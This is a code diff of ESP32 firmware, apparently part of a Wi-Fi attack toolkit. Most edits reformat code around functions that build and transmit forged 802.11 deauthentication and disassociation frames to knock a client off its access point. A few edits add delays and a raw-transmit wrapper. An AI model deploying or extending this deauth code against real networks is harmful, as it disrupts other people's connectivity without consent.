@@ -4,8 +4,8 @@
 #include "core/mykeyboard.h"
 #include "core/net_utils.h"
 #include "core/utils.h"
-#include "core/wifi/wifi_common.h"
 #include "core/wifi/webInterface.h"
+#include "core/wifi/wifi_common.h"
 #include "scan_hosts.h"
 #include "wifi_atks.h"
 #include <esp_wifi.h>
@@ -41,27 +41,27 @@ void getGatewayMAC(uint8_t gatewayMAC[6]) {
     }
 }
 
-bool isMACZero(const uint8_t* mac) {
+bool isMACZero(const uint8_t *mac) {
     for (int i = 0; i < 6; i++) {
         if (mac[i] != 0x00) return false;
     }
     return true;
 }
 
-bool macCompare(const uint8_t* mac1, const uint8_t* mac2) {
+bool macCompare(const uint8_t *mac1, const uint8_t *mac2) {
     for (int i = 0; i < 6; i++) {
         if (mac1[i] != mac2[i]) return false;
     }
     return true;
 }
 
-int getAPChannel(const uint8_t* target_bssid) {
+int getAPChannel(const uint8_t *target_bssid) {
     int found_channel = 0;
 
     int numNetworks = WiFi.scanNetworks(false, false);
 
     for (int i = 0; i < numNetworks; i++) {
-        uint8_t* bssid_ptr = WiFi.BSSID(i);
+        uint8_t *bssid_ptr = WiFi.BSSID(i);
 
         if (macCompare(bssid_ptr, target_bssid)) {
             found_channel = WiFi.channel(i);
@@ -93,9 +93,7 @@ bool tryMonitorMode(uint8_t channel) {
 
     esp_wifi_set_mode(WIFI_MODE_STA);
 
-    wifi_promiscuous_filter_t filter = {
-        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
-    };
+    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
     esp_wifi_set_promiscuous_filter(&filter);
     esp_wifi_set_promiscuous(true);
 
@@ -115,12 +113,10 @@ bool tryMonitorMode(uint8_t channel) {
     return true;
 }
 
-void buildOptimizedDeauthFrame(uint8_t* frame, 
-                              const uint8_t* dest,
-                              const uint8_t* src,
-                              const uint8_t* bssid,
-                              uint8_t reason = 0x07,
-                              bool is_disassoc = false) {
+void buildOptimizedDeauthFrame(
+    uint8_t *frame, const uint8_t *dest, const uint8_t *src, const uint8_t *bssid, uint8_t reason = 0x07,
+    bool is_disassoc = false
+) {
     frame[0] = is_disassoc ? 0xA0 : 0xC0;
     frame[1] = 0x00;
 
@@ -178,9 +174,7 @@ void stationDeauth(Host host) {
         WiFi.mode(WIFI_AP);
 
         String currentSsid = WiFi.SSID();
-        if (currentSsid.length() == 0) {
-            currentSsid = "DEAUTH_" + String(random(1000, 9999));
-        }
+        if (currentSsid.length() == 0) { currentSsid = "DEAUTH_" + String(random(1000, 9999)); }
 
         if (!WiFi.softAP(currentSsid.c_str(), emptyString, channel, 1, 4, false)) {
             Serial.println("Fail Starting AP Mode");
@@ -227,15 +221,19 @@ void stationDeauth(Host host) {
         }
 
         if (enhanced_mode) {
-            esp_wifi_80211_tx(WIFI_IF_STA, deauth_ap_to_sta, 26, false);
-            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_ap_to_sta, 26, false);
-            esp_wifi_80211_tx(WIFI_IF_STA, deauth_sta_to_ap, 26, false);
-            esp_wifi_80211_tx(WIFI_IF_STA, disassoc_sta_to_ap, 26, false);
+            wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
+            wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
+            wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
+            wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
         } else {
             send_raw_frame(deauth_ap_to_sta, 26);
+            vTaskDelay(pdMS_TO_TICKS(1));
             send_raw_frame(disassoc_ap_to_sta, 26);
+            vTaskDelay(pdMS_TO_TICKS(1));
             send_raw_frame(deauth_sta_to_ap, 26);
+            vTaskDelay(pdMS_TO_TICKS(1));
             send_raw_frame(disassoc_sta_to_ap, 26);
+            vTaskDelay(pdMS_TO_TICKS(1));
         }
 
         cont += 4;
@@ -258,9 +256,7 @@ void stationDeauth(Host host) {
         }
     }
 
-    if (enhanced_mode) {
-        esp_wifi_set_promiscuous(false);
-    }
+    if (enhanced_mode) { esp_wifi_set_promiscuous(false); }
 
     wifiDisconnect();
     WiFi.mode(WIFI_STA);
